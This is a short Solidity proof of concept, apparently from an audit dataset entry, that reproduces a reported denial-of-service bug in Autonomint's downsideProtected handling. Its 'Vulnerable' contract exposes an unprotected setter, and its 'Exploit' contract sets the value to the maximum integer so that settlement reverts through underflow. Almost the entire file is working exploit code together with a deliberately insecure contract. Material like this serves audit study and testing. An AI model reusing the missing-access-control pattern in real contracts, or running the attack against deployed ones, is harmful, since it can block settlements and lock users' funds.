// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 45461: Autonomint downsideProtected DoS. Reduced local model preserves the reported state transition.

contract Vulnerable {
    uint256 public downsideProtected; function setDownside(uint256 p) external { downsideProtected = p; } function settle(uint256 pnl) external view returns (uint256) { return pnl - downsideProtected; }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        bug.setDownside(type(uint256).max); (bool ok,) = address(bug).call(abi.encodeWithSignature("settle(uint256)", 1)); success = !ok;
    }
}


